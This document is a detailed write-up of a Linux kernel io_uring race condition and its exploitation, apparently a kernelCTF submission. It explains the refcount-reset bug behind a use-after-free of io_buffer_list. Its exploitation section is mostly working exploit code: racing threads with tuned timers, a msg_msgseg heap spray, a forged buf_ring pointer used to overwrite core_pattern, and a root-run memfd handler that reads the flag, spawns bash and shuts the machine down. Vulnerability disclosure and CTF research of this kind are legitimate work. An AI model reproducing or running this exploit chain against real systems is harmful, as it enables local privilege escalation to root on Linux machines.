## 1. Overview

The vulnerability exists in the io_uring subsystem and involves a race condition in reference count updates. It occurs when upgrading a `io_buffer_list` (pbuf) from a legacy selected buffer to a ring buffer while being concurrently mmap-ed.

## 2. Root Cause Analysis

### 2.1. Upgrading pbuf

When using io_uring, a process can pre-register buffers, enabling future references by specifying an ID. These buffers, referred to as provided buffer (pbuf) in the source code, are represented as `io_buffer_list` structures within io_uring. They come in two types: legacy selected buffers and ring buffers.

Legacy selected buffers are registered using the `IORING_OP_PROVIDE_BUFFERS` opcode. The handler `io_provide_buffers()` first allocates a new `io_buffer_list` [1], adds it to the global array [2], and then initializes it via `io_add_buffers()` [3].

``` c
int io_provide_buffers(struct io_kiocb *req, unsigned int issue_flags)
{
    struct io_provide_buf *p = io_kiocb_to_cmd(req, struct io_provide_buf);
    struct io_ring_ctx *ctx = req->ctx;
    struct io_buffer_list *bl;
    int ret = 0;

    // [...]
    bl = kzalloc(sizeof(*bl), GFP_KERNEL_ACCOUNT); // [1]
    ret = io_buffer_add_list(ctx, bl, p->bgid);    // [2]
    ret = io_add_buffers(ctx, p, bl);              // [3]
    // [...]
}
```

Within `io_add_buffers()`, one or more `io_buffer` entries are created according to the user's parameters. These buffers are managed through the `buf_list` field of the associates `io_buffer_list` [4].

``` c
static int io_add_buffers(struct io_ring_ctx *ctx, struct io_provide_buf *pbuf,
              struct io_buffer_list *bl)
{
    struct io_buffer *buf;
    u64 addr = pbuf->addr;
    int i, bid = pbuf->bid;

    for (i = 0; i < pbuf->nbufs; i++) {
        // [...]
        buf = list_first_entry(&ctx->io_buffers_cache, struct io_buffer,
                    list);
        list_move_tail(&buf->list, &bl->buf_list); // [4]
        buf->addr = addr;
        buf->len = min_t(__u32, pbuf->len, MAX_RW_COUNT);
        buf->bid = bid;
        buf->bgid = pbuf->bgid;
        addr += pbuf->len;
        bid++;
        // [...]
    }
}
```

In contrast, ring buffers are registered using the `IORING_REGISTER_PBUF_RING` opcode. If the specified buffer ID does not yet exist, the handler `io_register_pbuf_ring()` allocates a new `io_buffer_list` [5]. Based on the provided flags, it then initializes the ring buffer using either `io_pin_pbuf_ring()` or `io_alloc_pbuf_ring()` [6, 7], and finally adds the buffer to the global array [8].

If a buffer with the specified ID already exists, `io_register_pbuf_ring()` may reuse the existing `io_buffer_list` under certain conditions. One such condition is that the existing list must be an empty legacy selected buffer — i.e., a buffer with no `io_buffer` entries [9]. This enables the "upgrade" of an unused legacy selected buffer into a ring buffer.

``` c
int io_register_pbuf_ring(struct io_ring_ctx *ctx, void __user *arg)
{
    struct io_uring_buf_reg reg;
    struct io_buffer_list *bl, *free_bl = NULL;
    int ret;

    lockdep_assert_held(&ctx->uring_lock);

    if (copy_from_user(&reg, arg, sizeof(reg)))
        return -EFAULT;

    // [...]

    bl = io_buffer_get_list(ctx, reg.bgid);
    if (bl) {
        if (bl->is_mapped || !list_empty(&bl->buf_list) /* [9] */)
            return -EEXIST;
    } else {
        free_bl = bl = kzalloc(sizeof(*bl), GFP_KERNEL); // [5]
        if (!bl)
            return -ENOMEM;
    }

    // [...]
    if (!(reg.flags & IOU_PBUF_RING_MMAP))
        ret = io_pin_pbuf_ring(&reg, bl); // [6]
    else
        ret = io_alloc_pbuf_ring(ctx, &reg, bl); // [7]

    if (!ret) {
        bl->nr_entries = reg.ring_entries;
        bl->mask = reg.ring_entries - 1;

        io_buffer_add_list(ctx, bl, reg.bgid); // [8]
        return 0;
    }
    // [...]
}
```

In this context, `io_buffer_add_list()` may be invoked even when the corresponding `io_buffer_list` is already present. While the function assumes it is initializing a newly allocated buffer and sets the reference count to 1 [10], this assumption breaks in reuse scenarios. As a result, the reference count may be reset incorrectly, leading to a potential race condition during concurrent access.

``` c
static int io_buffer_add_list(struct io_ring_ctx *ctx,
                  struct io_buffer_list *bl, unsigned int bgid)
{
    // [...]
    bl->bgid = bgid;
    atomic_set(&bl->refs, 1); // [10]
    return xa_err(xa_store(&ctx->io_bl_xa, bgid, bl, GFP_KERNEL));
}
```

### 2.2. mmap-ing pbuf

In most cases, access to `io_buffer_list` in io_uring is protected by locks, preventing simultaneous operations on the same buffer. But the one exception is the mmap handler, `io_uring_validate_mmap_request()`, which uses `io_buffer_list` without acquiring a lock.

If the masked offset of the memory mapping request corresponds to `IORING_OFF_PBUF_RING`, the handler calculates the buffer ID from the offset [1], then calls `io_pbuf_get_bl()` to retrieve the corresponding `io_buffer_list` [2]. After accessing it, the handler releases the reference count [3].

``` c
static void *io_uring_validate_mmap_request(struct file *file,
                        loff_t pgoff, size_t sz)
{
    struct io_ring_ctx *ctx = file->private_data;
    loff_t offset = pgoff << PAGE_SHIFT;
    struct page *page;
    void *ptr;

    switch (offset & IORING_OFF_MMAP_MASK) {
    // [...]
    case IORING_OFF_PBUF_RING: {
        struct io_buffer_list *bl;
        unsigned int bgid;

        bgid = (offset & ~IORING_OFF_MMAP_MASK) >> IORING_OFF_PBUF_SHIFT; // [1]
        bl = io_pbuf_get_bl(ctx, bgid); // [2]
        if (IS_ERR(bl))
            return bl;
        ptr = bl->buf_ring;
        io_put_bl(ctx, bl); // [3]
        break;
        }
    // [...]
    }
}
```

The function `io_pbuf_get_bl()` fetches the `io_buffer_list` from the global array based on the given ID, but only returns it if the list is marked as mappable (`is_mmap`) [4]. It also increases the reference count using `atomic_inc_not_zero()` to ensure safe concurrent access without a lock.

``` c
struct io_buffer_list *io_pbuf_get_bl(struct io_ring_ctx *ctx,
                      unsigned long bgid)
{
    struct io_buffer_list *bl;
    bool ret;

    // [...]
    bl = xa_load(&ctx->io_bl_xa, bgid);
    ret = false;
    if (bl && bl->is_mmap) // [4]
        ret = atomic_inc_not_zero(&bl->refs);
    // [...]

    if (ret)
        return bl;

    return ERR_PTR(-EINVAL);
}
```

### 2.3. The Race

When upgrading a legacy selected buffer to a ring buffer, the function `io_buffer_add_list()` is called again. Although this function directly sets the reference count to 1 — seemingly harmless — issues arise if the mmap handler is running concurrently.

Under specific timing conditions, the following execution sequence can occur, where the reference count is incorrectly reset to 1 while the mmap handler is still holding a reference, resulting in a Use-After-Free of `io_buffer_list`:

```
[thread-1]                                     [thread-2]
io_uring_validate_mmap_request()               io_register_pbuf_ring()
  io_pbuf_get_bl()                               io_alloc_pbuf_ring()
                                                   bl->is_mmap = 1
    check if it is mappable (bl->is_mmap == 1)
    bl->refs += 1 (1 -> 2)                       io_buffer_add_list()
                                                   bl->refs = 1 (2 -> 1)
  io_put_bl()
    bl->refs -= 1 (1 -> 0)
    kfree_rcu()
    => The io_buffer_list is freed while still being referenced in the global array!
```

## 3. Exploitation

### 3.1. Trigger Vulnerability

The exploitation involves two threads: one responsible for upgrading the victim pbuf, and the other for mmap-ing it. The former, referred to as the "upgrade thread", runs on CPU 0 and serves as the main thread. The latter, known as the "mmap thread", is pinned to CPU 1.

### 3.1.1. Main/Upgrade Thread (CPU 0)

During the initialization phase, two opcodes are added to the opcode ring buffer to create an empty legacy selected buffer, which is required to trigger the vulnerability. The buffer ID can be arbitrarily assigned; in this exploit, it is set to 0x69.

``` c
int main(int argc, char *argv[])
{
    // [...]
    /**
     * To trigger the vulnerability, we first need to create an empty legacy selected buffer.
     * This can be achieved using the following two IO_URING opcodes:
     *   1. IORING_OP_PROVIDE_BUFFERS: create a legacy selected buffer which has one buffer.
     *   2. IORING_OP_REMOVE_BUFFERS: remove a buffer from specified legacy selected buffer.
     */
    {
        struct io_uring_sqe *sqe = sq;

        sqe[0].opcode = IORING_OP_PROVIDE_BUFFERS;
        sqe[0].addr = (unsigned long)dummy;
        sqe[0].len = 1;
        sqe[0].fd = 1; // nbufs
        sqe[0].buf_group = 0x69;
        sqe[0].off = 0;
        
        sqe[1].opcode = IORING_OP_REMOVE_BUFFERS;
        sqe[1].fd = 1; // nbufs
        sqe[1].buf_group = 0x69;
    }
    
    // Initialize metadata of the opcode ring buffer.
    struct io_rings *ring = cq;
    ring->sq.head = 0;
    ring->sq.tail = 2;

    // [...]
}
```

Inside the loop that attempts to race the condition, the thread first executes the previously added opcodes to create an empty legacy selected buffer. After synchronizing with the mmap thread using a barrier, it proceeds to execute the `IORING_REGISTER_PBUF_RING` opcode to upgrade the pbuf.

``` c
int main(int argc, char *argv[])
{
    // [...]

    // ==================== upgrade thread (cpu-0) ====================
    pin_on_cpu(0);
    while (1) {
        // [...]
        
        // Create an empty legacy selected buffer with id 0x69.
        SYSCHK(io_uring_enter(ioring_fd, 2, 0, 0, NULL));
        
        struct itimerspec new = { .it_value.tv_nsec = timeout_upgrade_thread_cpu0 };
        pthread_barrier_wait(&barrier);
        {
            timerfd_settime(tfd_for_upgrade_cpu0, TFD_TIMER_CANCEL_ON_SET, &new, NULL);
            
            // Upgrade 0x69 pbuf from a empty legacy selected buffer to a ring buffer.
            struct io_uring_buf_reg reg = {};
            reg.pad |= IOU_PBUF_RING_MMAP;
            reg.ring_entries = 1;
            reg.bgid = 0x69;

            SYSCHK(io_uring_register(ioring_fd, IORING_REGISTER_PBUF_RING, &reg, 1));
        }
        pthread_barrier_wait(&barrier);
        // [...]
    }
}
```

### 3.1.2. mmap Thread (CPU 1)

The mmap thread's role is straightforward: after synchronizing with the upgrade thread, it attempts to mmap the pbuf.

``` c
void *race_mmap_thread(void *arg)
{
    // ==================== mmap thread (cpu-1) ====================
    pin_on_cpu(1);
    while (1) {
        // [...]
        pthread_barrier_wait(&barrier);
        {
            // [...]
            // Try to map the 0x69 io_buffer_list.
            ptr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, ioring_fd, IORING_OFF_PBUF_RING + (0x69 << IORING_OFF_PBUF_SHIFT));
            if (ptr != MAP_FAILED) {
                munmap(ptr, 0x1000);
            }
        }
        pthread_barrier_wait(&barrier);
    }
}
```

## 3.2. Primitive

If the vulnerability is successfully triggered, the pbuf is freed but still accessible through a global array. This results in a UAF of the `io_buffer_list`.

The structure of `io_buffer_list` is as follows:

``` c
struct io_buffer_list {
        union {
                struct list_head   buf_list;             /*     0    16 */
                struct {
                        struct page * * buf_pages;       /*     0     8 */
                        struct io_uring_buf_ring * buf_ring; /*     8     8 */
                };                                       /*     0    16 */
                struct callback_head rcu __attribute__((__aligned__(8))); /*     0    16 */
        } __attribute__((__aligned__(8)));               /*     0    16 */
        __u16                      bgid;                 /*    16     2 */
        __u16                      buf_nr_pages;         /*    18     2 */
        __u16                      nr_entries;           /*    20     2 */
        __u16                      head;                 /*    22     2 */
        __u16                      mask;                 /*    24     2 */

        /* XXX 2 bytes hole, try to pack */

        atomic_t                   refs;                 /*    28     4 */
        __u8                       is_mapped;            /*    32     1 */
        __u8                       is_mmap;              /*    33     1 */

        /* size: 40, cachelines: 1, members: 9 */
        /* sum members: 32, holes: 1, sum holes: 2 */
        /* padding: 6 */
        /* forced alignments: 1 */
        /* last cacheline: 40 bytes */
} __attribute__((__aligned__(8)));
```

Once gaining control over the contents of a `io_buffer_list`, the `buf_ring` field can be manipulated to point to sensitive kernel data commonly used in privilege escalation, such as `modprobe_path` and `core_pattern`.

In the io_uring mmap handler, the attacker-controlled `buf_ring` pointer is returned by `io_uring_validate_mmap_request()` [1]. This pointer is then passed to `virt_to_phys()` and ultimately mapped into user space via `remap_pfn_range()` [2].

``` c
// io_uring/io_uring.c
static __cold int io_uring_mmap(struct file *file, struct vm_area_struct *vma)
{
    size_t sz = vma->vm_end - vma->vm_start;
    unsigned long pfn;
    void *ptr;

    ptr = io_uring_validate_mmap_request(file, vma->vm_pgoff, sz);
    // [...]
    pfn = virt_to_phys(ptr) >> PAGE_SHIFT;
    return remap_pfn_range(vma, vma->vm_start, pfn, sz, vma->vm_page_prot); // [2]
}

static void *io_uring_validate_mmap_request(struct file *file,
                        loff_t pgoff, size_t sz)
{
    // [...]
    switch (offset & IORING_OFF_MMAP_MASK) {
    case IORING_OFF_PBUF_RING: {
        struct io_buffer_list *bl;
        unsigned int bgid;

        bgid = (offset & ~IORING_OFF_MMAP_MASK) >> IORING_OFF_PBUF_SHIFT;
        bl = io_pbuf_get_bl(ctx, bgid);
        // [...]
        ptr = bl->buf_ring; // [1]
        io_put_bl(ctx, bl);
        break;
        }
    }
    // [...]
    return ptr;
}
```

As a result, when data is written to the corresponding memory mapping in user space, the underlying kernel memory is also modified.

## 3.3. Heap Spraying

In the `io_provide_buffers()` function, a `io_buffer_list` is allocated from the `kmalloc-cg-64` slab.

``` c
// io_uring/kbuf.c
int io_provide_buffers(struct io_kiocb *req, unsigned int issue_flags)
{
	// [...]
    bl = kzalloc(sizeof(*bl), GFP_KERNEL_ACCOUNT);
	// [...]
}
```

To reclaim the freed `io_buffer_list`, a structure with controllable data that can reside in the `kmalloc-cg-64` slab is required. The `msg_msgseg` seems like a suitable candidate due to its minimal 8-byte header, which makes it practical choice for crafting a fake `io_buffer_list` — particularly when targeting the `buf_ring` field at offset 0x8.

Since `io_buffer_list` is freed via `kfree_rcu()`, its release operation is handled by the RCU worker. Therefore, we must wait for several seconds before spraying `msg_msgseg`.

``` c
int main(int argc, char *argv[])
{
    // [...]
    // ==================== upgrade thread (cpu-0) ====================
    pin_on_cpu(0);
    while (1) {
        // [...]
        /**
         * If the exploit succeeds, the refcount of the 0x69 pbuf will be zero,
         * causing mmap to fail.
         *
         * Otherwise, mmap will succeed and return a valid pointer.
         */
        pbuf = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, ioring_fd, IORING_OFF_PBUF_RING + (0x69 << IORING_OFF_PBUF_SHIFT));
        if (pbuf == MAP_FAILED) {
            printf("[+] success!\n");
            break;
        }
    }

    /**
     * Since pbuf (io_buffer_list) is freed using kfree_rcu(), we need to wait
     * five more seconds (KFREE_DRAIN_JIFFIES) for the kfree_rcu_monitor() worker to wake up.
     */
    sleep(6);

    // Spray msg_msgseg to reclaim freed io_buffer_list which is in kmalloc-cg-64.
    *(unsigned long *)payload = 1; // mtype = 1
    for (int i = 0; i < SPRAY_CG_64_MSG_MSGSEG; i++)
        msgsnd(spray_cg_64_msg_queue[i], payload, (PAGE_SIZE - sizeof(struct msg_msg)) + 64 - sizeof(struct msg_msgseg), 0);
    
    // [...]
}
```

By crafting the `buf_ring` field of the victim `io_buffer_list`, we can overwrite the `core_pattern` with a controlled string, enabling the execution of a payload via memfd.

``` c
int main(int argc, char *argv[])
{
    // [...]
    /** 
     * We plan to reclaim the victim io_buffer_list with msg_msgseg, so we craft the payload to
     * a fake io_buffer_list with the address of core_pattern as ring buffer pointer.
     */
    {
        struct io_buffer_list *fake_io_bl = payload + (PAGE_SIZE - sizeof(struct msg_msg));
        fake_io_bl->buf_ring = ktext + (CORE_PATTERN_OFFSET & ~0xfff);
        fake_io_bl->refs = 0x41;
        fake_io_bl->is_mmap = 1;
    }
    // [...]

    pbuf = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, ioring_fd, IORING_OFF_PBUF_RING + (0x69 << IORING_OFF_PBUF_SHIFT));
    strcpy(pbuf + (CORE_PATTERN_OFFSET & 0xfff), "|/proc/%P/fd/666 %P");
    // [...]
}
```

## 3.4. Bypass KASLR

The vulnerability primitive does not provide a way to leak kernel addresses and is only exploitable when a valid kernel text address is known, as setting the `buf_ring` pointer requires it.

To address this, we use EntryBleed, a time-based side-channel attack, to leak the kernel base address. More details can be found at https://www.willsroot.io/2022/12/entrybleed.html or other kernelCTF submissions.

## 3.5. Extend the Race Window

Because this vulnerability can only be triggered under a very specific execution order, it is necessary to extend the race window for both threads to increase the probability of success.

Through experimentation, we observed that the syscall handling overhead in the remote environment is approximately 150 nanoseconds. As a result, each timeout macro includes an additional offset of 150 to account for this overhead. Based on this, we can determine two reasonable timeout ranges for hitting the race.

``` c
#define DEFAULT_TIMEOUT_CPU0 (850  + 150)
#define MAX_TIMEOUT_CPU0     (1700 + 150)
#define SHIFT_TIMEOUT_CPU0   10

#define DEFAULT_TIMEOUT_CPU1 (1000 + 150)
#define MAX_TIMEOUT_CPU1     (2000 + 150)
#define SHIFT_TIMEOUT_CPU1   10
```

The timeout values are adjusted dynamically on each exploitation attempt to explore different timing combinations and maximize the chances of hitting the race window.

``` c
int main(int argc, char *argv[])
{
    // [...]
    // ==================== upgrade thread (cpu-0) ====================
    pin_on_cpu(0);
    while (1) {
        /**
         * Depending on the host and our luck, the required timeout may vary.
         * The simplest method is to brute-force all possible timeout values.
         */
        timeout_upgrade_thread_cpu0 += SHIFT_TIMEOUT_CPU0;
        if (timeout_upgrade_thread_cpu0 >= MAX_TIMEOUT_CPU0) {
            timeout_upgrade_thread_cpu0 = DEFAULT_TIMEOUT_CPU0;
            
            timeout_mmap_thread_cpu1 += SHIFT_TIMEOUT_CPU1;
            if (timeout_mmap_thread_cpu1 >= MAX_TIMEOUT_CPU1)
                timeout_mmap_thread_cpu1 = DEFAULT_TIMEOUT_CPU1;
        }
        // [...]
    }
}
```

The upgrade thread sets a timer using the CPU 0 timeout value just before attempting to upgrade the pbuf.

``` c
int main(int argc, char *argv[])
{
    // [...]
    // ==================== upgrade thread (cpu-0) ====================
    pin_on_cpu(0);
    while (1) {
        // [...]

        struct itimerspec new = { .it_value.tv_nsec = timeout_upgrade_thread_cpu0 };
        pthread_barrier_wait(&barrier);
        {
            timerfd_settime(tfd_for_upgrade_cpu0, TFD_TIMER_CANCEL_ON_SET, &new, NULL);
            
            // Upgrade 0x69 pbuf from a empty legacy selected buffer to a ring buffer.
            struct io_uring_buf_reg reg = {};
            reg.pad |= IOU_PBUF_RING_MMAP;
            reg.ring_entries = 1;
            reg.bgid = 0x69;

            SYSCHK(io_uring_register(ioring_fd, IORING_REGISTER_PBUF_RING, &reg, 1));
        }
        pthread_barrier_wait(&barrier);
        // [...]
    }
    // [...]
}
```

Similarly, the mmap thread sets its timer based on the CPU 1 timeout value just before mmap-ing the target pbuf.

``` c
void *race_mmap_thread(void *arg)
{
    // ==================== mmap thread (cpu-1) ====================
    pin_on_cpu(1);
    while (1) {
        struct itimerspec new = { .it_value.tv_nsec = timeout_mmap_thread_cpu1 };
        void *ptr;
        
        pthread_barrier_wait(&barrier);
        {
            timerfd_settime(tfd_for_mmap_cpu1, TFD_TIMER_CANCEL_ON_SET, &new, NULL);
            
            // Try to map the 0x69 io_buffer_list.
            ptr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, ioring_fd, IORING_OFF_PBUF_RING + (0x69 << IORING_OFF_PBUF_SHIFT));
            if (ptr != MAP_FAILED) {
                munmap(ptr, 0x1000);
            }
        }
        pthread_barrier_wait(&barrier);
    }
}
```

Even with heuristic optimizations, hitting the race condition remains highly unreliable and difficult.

## 3.6. Get The Flag

During the initialization phase, a `core_pattern` monitoring process is launched to detect whether the exploitation has succeeded.

``` c
int main(int argc, char *argv[])
{
    // [...]
    /**
     * Create a child process to monitor core_pattern. If the core_pattern is
     * overwritten due to the vulnerability, it immediately triggers a segfault.
     */
    if (fork() == 0) {
        setup_core_pattern_monitor();
    }
    // [...]
}
```

This monitoring process duplicates the current exploitation binary into a memfd (file descriptor 666), and continuously polls the contents of `/proc/sys/kernel/core_pattern`. Once a modification is detected, the process crashes via a null dereference to trigger the core dump.

``` c
void setup_core_pattern_monitor()
{
    pin_on_cpu(1);
    setsid();

    int memfd = memfd_create("", 0);
    char buf[0x100] = {};

    // Duplicate the exploit binary to memfd 666.
    sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff);
    dup2(memfd, 666);
    close(memfd);

    // Poll the core_pattern content and trigger segfault if it is modified.
    while (1) {
        int corefd = open("/proc/sys/kernel/core_pattern", O_RDONLY);
        read(corefd, buf, sizeof(buf));
        close(corefd);
        if (strncmp(buf, "|/proc/%P/fd/666", 0x10) == 0)
            break;
        sleep(1);
    }
    *(unsigned long *)0 = 0;
}
```

As soon as the race condition is hit and the freed `io_buffer_list` is reclaimed via `msg_msgseg` spraying, we overwrites the `core_pattern` to execute the memfd binary. This string causes the kernel to run the binary located at `/proc/<pid>/fd/666` when a core dump occurs.

``` c
int main(int argc, char *argv[])
{
    // [...]
    pbuf = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, ioring_fd, IORING_OFF_PBUF_RING + (0x69 << IORING_OFF_PBUF_SHIFT));
    strcpy(pbuf + (CORE_PATTERN_OFFSET & 0xfff), "|/proc/%P/fd/666 %P");
    // [...]
}
```

When the memfd binary is executed via the `core_pattern` with root privileges, it receives the crashing process's PID as its second argument. The memfd handler then uses `pidfd_getfd()` to duplicate the crashing process's stdout, prints the flag, and shuts down the machine.

``` c
int main(int argc, char *argv[])
{
    int ret;
    void *cq;
    void *sq;
    void *dummy;
    void *pbuf;
    void *payload;
    unsigned long ktext;

    /**
     * When the exploit succeeds, the core_pattern monitor will trigger a segfault
     * and execute the memfile as root, passing the PID as an argument.
     */
    if (argc > 1) {
        int pid = strtoull(argv[1], 0, 10);
        int pfd = syscall(SYS_pidfd_open, pid, 0);
        int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
        dup2(stdoutfd, 1);
        
        system("cat /flag;echo o>/proc/sysrq-trigger");
        execlp("bash", "bash", NULL);
    }
    // [...]
}
```
